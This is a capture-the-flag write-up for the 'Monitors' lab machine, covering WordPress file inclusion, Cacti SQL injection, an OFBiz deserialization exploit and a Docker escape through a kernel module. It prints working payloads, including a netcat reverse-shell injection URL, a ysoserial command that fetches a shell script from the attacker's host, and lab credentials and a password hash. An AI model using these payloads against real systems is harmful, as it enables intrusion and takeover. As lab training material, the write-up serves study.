@@ -1,0 +1,291 @@
+# Main points
+* wpscan to scan for wordpress vulnerabilities
+* LFI to RCE [{number}](/assets/%23%5Ec022f4%7Cproc/self/fd/%7Bnumber%7D)
+* apache2 available site default [#^2e667f| conf path](/assets/%23%5E2e667f%7C%20conf%20path)
+* Cacti [#^150e6a|SQLi](/assets/%23%5E150e6a%7CSQLi)
+* grep on user and on processes `ps -aux` `netstat -antup`
+* docker escape [#^3839ca|sys_module capability](/assets/%23%5E3839ca%7Csys_module%20capability)
+
+
+# Enumeration
+We start with nmap enumeration
+* 22/tcp    open     ssh            syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+* 80/tcp    open     http           syn-ack     Apache httpd 2.4.29 ((Ubuntu))
+
+We check port 80
+![Pasted image 20210714031300.png](/assets/Pasted%20image%2020210714031300.png)
+We need to add monitors.htb to our /etc/hosts file.
+
+ ==Pro tip== : **the web server can see if you access with hostname or IP adress because your browser sends a header Host that contains what is typed in your URL bar. So hostname or IP adress :)**
+ 
+ Now it works
+ 
+ ![Pasted image 20210714031612.png](/assets/Pasted%20image%2020210714031612.png)
+ 
+ We see this webpage is powered with Wordpress
+ ![Pasted image 20210714031839.png](/assets/Pasted%20image%2020210714031839.png)
+ 
+ We scan with `wpscan`
+ ```bash
+wpscan --url http://monitors.htb -e ap,t,u
+```
+1. **-e**: enumerate
+	* **ap**: All plugins
+	* **t**: themes
+	* **u**: user
+
+We see there is a plugin used:
+![Pasted image 20210714191859.png](/assets/Pasted%20image%2020210714191859.png)
+
+Let's see if there is an exploit in exploitDB.
+We find this exploit of [Remote File Inclusion](https://www.exploit-db.com/exploits/44544)
+We can trigger it with
+```php
+http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=<URL>
+```
+Let's read `/etc/passwd`
+![Pasted image 20210714195148.png](/assets/Pasted%20image%2020210714195148.png)
+
+So there is a user Marcus
+
+Now let's read the `wp-config.php` file to get some secrets
+```
+http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php
+```
+
+We see this
+![Pasted image 20210714195535.png](/assets/Pasted%20image%2020210714195535.png)
+Let's check the source code:
+![Pasted image 20210714200023.png](/assets/Pasted%20image%2020210714200023.png)
+Bingo !
+
+```php
+<?php
+define( 'DB_NAME', 'wordpress' );
+/** MySQL database username */
+define( 'DB_USER', 'wpadmin' );
+/** MySQL database password */
+define( 'DB_PASSWORD', 'BestAdministrator@2020!' );
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+define( 'DB_CHARSET', 'utf8mb4' );
+
+define( 'DB_COLLATE', '' );
+
+define( 'AUTH_KEY',         'KkY%W@>T}4CKTw5{.n_j3bywoB0k^|OKX0{}5|UqZ2!VH!^uWKJ.O oROc,h pp:' );
+define( 'SECURE_AUTH_KEY',  '*MHA-~<-,*^$raDR&uxP)k(~`k/{PRT(6JliOO9XnYYbFU?Xmb#9USEjmgeHYYpm' );
+define( 'LOGGED_IN_KEY',    ')F6L,A23Tbr9yhrhbgjDHJPJe?sCsDzDow-$E?zYCZ3*f40LSCIb] E%zrW@bs3/' );
+define( 'NONCE_KEY',        'g?vl(p${jG`JvDxVw-]#oUyd+uvFRO1tAUZQG_sGg&Q7O-*tF[KIe$weE^$bB3%C' );
+define( 'AUTH_SALT',        '8>PIil3 7re_:3&@^8Zh|p^I8rwT}WpVr5|t^ih05A:]xjTA,UVXa8ny:b--/[Jk' );
+define( 'SECURE_AUTH_SALT', 'dN c^]m:4O|GyOK50hQ1tumg4<JYlD2-,r,oq7GDjq4M Ri:x]Bod5L.S&.hEGfv' );
+define( 'LOGGED_IN_SALT',   'tCWVbTcE*_T_}X3#t+:)>N+D%?vVAIw#!*&OK78M[@ YT0q):G~A:hTv`bO<,|68' );
+define( 'NONCE_SALT',       'sa>i39)9<vVyhE3auBVzl%=p23NJbl&)*.{`<*>;R2=QHqj_a.%({D4yI-sy]D8,' );
+$table_prefix = 'wp_';
+define( 'WP_DEBUG', false );
+
+if ( ! defined( 'ABSPATH' ) ) {
+	define( 'ABSPATH', __DIR__ . '/' );
+}
+require_once ABSPATH . 'wp-settings.php';
+```
+But the creds dont work in ssh, we need further enumeration.
+
+Let's try to go from LFI to RCE.
+
+We find this article https://infosecwriteups.com/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899 ^c022f4
+
+So we know that `“/proc/self/fd”` provides symbolic shortcut to access-logs and various other system related file.
+
+So we use burp Intruder to bruteforce the id's
+
+![Pasted image 20210717000745.png](/assets/Pasted%20image%2020210717000745.png)
+
+We see that the maximum length is the payload `10`
+We see there is a call to `cacti`
+let's check
+`/etc/apache2/sites-available/000-default.conf` ^2e667f
+```
+# Default virtual host settings
+# Add monitors.htb.conf
+# Add cacti-admin.monitors.htb.conf <VirtualHost *:80> # The ServerName directive sets the request scheme, hostname and port that
+	# the server uses to identify itself. This is used when creating
+	# redirection URLs. In the context of virtual hosts, the ServerName
+	# specifies what hostname must appear in the request's Host: header to
+	# match this virtual host. For the default virtual host (this file) this
+	# value is not decisive as it is used as a last resort host regardless.
+	# However, you must set it for any further virtual host explicitly.
+	#ServerName www.example.com
+	ServerAdmin admin@monitors.htb
+	DocumentRoot /var/www/html
+	Redirect 403 /
+	ErrorDocument 403 "Sorry, direct IP access is not allowed. <br><br>If you are having issues accessing the site then contact the website administrator: admin@monitors.htb"
+	UseCanonicalName Off
+	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
+	# error, crit, alert, emerg.
+	# It is also possible to configure the loglevel for particular
+	# modules, e.g.
+	#LogLevel info ssl:warn
+	ErrorLog ${APACHE_LOG_DIR}/error.log
+	CustomLog ${APACHE_LOG_DIR}/access.log combined
+	# For most configuration files from conf-available/, which are
+	# enabled or disabled at a global level, it is possible to
+	# include a line for only one particular virtual host. For example the
+	# following line enables the CGI configuration for this host only
+	# after it has been globally disabled with "a2disconf".
+	#Include conf-available/serve-cgi-bin.conf </VirtualHost> # vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+```
+Let's add `cacti-admin.monitors.htb` to our `/etc/hosts`
+
+We connect and see there is a login page
+![Pasted image 20210717003613.png](/assets/Pasted%20image%2020210717003613.png)
+
+
+
+Let's try the creds of the admin
+`admin: BestAdministrator@2020!`
+
+We see there is Cacti version `Version 1.2.12`
+
+We find in exploitDB a [SQLi for version 1.2.12](https://www.exploit-db.com/exploits/49810)  where there is SQL injection issue in color.php in Cacti 1.2.12 that allows an admin to inject SQL via the filter parameter. This can lead to remote command execution because the product accepts stacked queries. ^150e6a
+
+let's setup netcat listener and here is our payload and URL exploit to trigger SQLi and RCE to get a shell.
+
+```bash
+http://cacti-admin.monitors.htb/cacti/color.php?action=export&header=false&filter=1%27)+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value=%27rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.10.103+4444+%3E/tmp/f;%27+where+name=%27path_php_binary%27;--+-
+```
+And then (ignore the download), requets again this URL
+```bash
+http://cacti-admin.monitors.htb/cacti/host.php?action=reindex
+```
+
+If it doesn't work you can just execute the python script of the exploit in exploitDB
+
+```bash
+script.py -t http://cacti-admin .monitors.htb -u admin -p BestAdministrator@2020! --lhost <IP> --lport 4444
+```
+
+We grep on "marcus" to see if there is any service related to him.
+`grep "marcus" /etc -R 2 >/dev/null`
+* **-R**: recursive
+* /etc : for config and static files
+	
+![Pasted image 20210717014035.png](/assets/Pasted%20image%2020210717014035.png)
+
+We see there is a backup.sh service
+`/etc/systemd/system/cacti-backup.service:ExecStart=/home/marcus/.backup/backup.sh`
+that executes a script from the /home/marcus directory
+
+We `cat` that file and find
+
+![Pasted image 20210717014424.png](/assets/Pasted%20image%2020210717014424.png)
+
+so the config_pass is the user marcus' password
+
+Let's ssh into marcus with password `VerticalEdge2020`
+
+![Pasted image 20210717014620.png](/assets/Pasted%20image%2020210717014620.png)
+
+It worked, we have user flag now
+
+# Priv Esc
+Let's get privilege escalation to get root
+
+We see there is a file `note.txt`
+![Pasted image 20210717014732.png](/assets/Pasted%20image%2020210717014732.png)
+
+So probably there is a docker image that is not for production, which means it probably runs root and likely to be vulnerable to docker escape.
+
+When enumerating with `netstat -antup` to see if there are services listening. We see there is a service listening at localhost:8443, port 8443 is an alternative HTTPS port
+since we are not localhost, let's make a ssh tunnel from 8443:localhost:8443
+`ssh -L 8443:127.0.0.1:8443 marcus@monitors.htb`
+And let's go to `localhost:8443`
+https://localhost:8443/
+
+![Pasted image 20210717125221.png](/assets/Pasted%20image%2020210717125221.png)
+
+Let's enumerate with gobuster
+`gobuster dir -u https://localhost:8443/ -w /usr/share/wordlists/dirb/common.txt -k -r`
+
+We find these directories
+
+![Pasted image 20210717182254.png](/assets/Pasted%20image%2020210717182254.png)
+
+They all redirect to a login page
+
+![Pasted image 20210717182316.png](/assets/Pasted%20image%2020210717182316.png)
+
+Let's see if there is a vulnerability in Apache OFBiz.
+
+We find a RCE caused by Java deserialization of untrusted data
+> The unsafe deserialization could be exploited to execute code remotely, essentially allowing an unauthenticated attacker to successfully take over Apache OFBiz.
+
+We find a metasploit module for it. But I don't want to use metasploit, so I tried another way, and I found this PoC of the [CVE-2020-9496](https://github.com/g33xter/CVE-2020-9496).
+> This vulnerability exists due to Java serialization issues when processing requests sent to /webtools/control/xmlrpc. A remote unauthenticated attacker can exploit this vulnerability by sending a crafted request. Successful exploitation would result in arbitrary code execution.
+
+Follow the steps of the PoC.
+
+For Step 4, make sure to put http in the URL of your machine
+```
+java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "wget http://{YOUR_IP}/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n"
+```
+
+
+For Step6, here is the command, replace the {BASE64_OUTPUT} with the output you got from the previous step
+```bash
+curl https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -v -d '<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">{BASE64_OUTPUT}</serializable></value></member></struct></value></param></params></methodCall>' -k  -H 'Content-Type:application/xml'
+```
+
+After executing the PoC, we have a root shell
+![Pasted image 20210717185538.png](/assets/Pasted%20image%2020210717185538.png)
+
+If you notice the host, you will see it's not `monitors.htb` because we are in a docker container.
+
+Let's download LinPeas and see if we can get an escape to root of system.
+
+```bash
+wget http://YOUR_IP/linpeas.sh
+```
+![Pasted image 20210717185935.png](/assets/Pasted%20image%2020210717185935.png)
+
+We see there is a sys_module capability that we can exploit to breakout of docker
+![Pasted image 20210717190351.png](/assets/Pasted%20image%2020210717190351.png)
+https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd ^3839ca
+
+Let's follow this blog, we start by showing our capabilities with `capsh --print`
+
+![Pasted image 20210717190554.png](/assets/Pasted%20image%2020210717190554.png)
+
+The container has SYS_MODULE capability. So we can insert/remove kernel modules in/from the kernel of the Docker host machine.
+
+Now we need to find the IP of our docker container, we can find that with `ifconfig` from marcus ssh session
+![Pasted image 20210717190702.png](/assets/Pasted%20image%2020210717190702.png)
+
+Then we compile a file to invoke a reverse shell with the help of usermode Helper API.
+![reverse-shell.c#^dcedab](/assets/reverse-shell.c%23%5Edcedab)
+Then we create a Makefile
+![reverse-shell.c#^e35de3](/assets/reverse-shell.c%23%5Ee35de3)
+
+And we send them to the docker container with wget
+![Pasted image 20210717191953.png](/assets/Pasted%20image%2020210717191953.png)
+
+![Pasted image 20210717192002.png](/assets/Pasted%20image%2020210717192002.png)
+
+Let's compile with `Make`
+
+![Pasted image 20210717192351.png](/assets/Pasted%20image%2020210717192351.png)
+
+Now in marcus ssh shell, start a netcat listener.
+![Pasted image 20210717192547.png](/assets/Pasted%20image%2020210717192547.png)
+
+Now we insert our compiled kernel module with `insmod`
+
+`insmod reverse-shell.ko`
+
+And we have root in marcus
+![Pasted image 20210717193039.png](/assets/Pasted%20image%2020210717193039.png)
+
+# root hash
+```
+$6$vSJnzptH$pCoAuyngEc2pUm3Hos6qTNzopXdvnXACaAZEDAQU4VoBc19qxa9eASxv/EKnkTEOWWGyuPobtS/QA2kAFkrWP0
+```
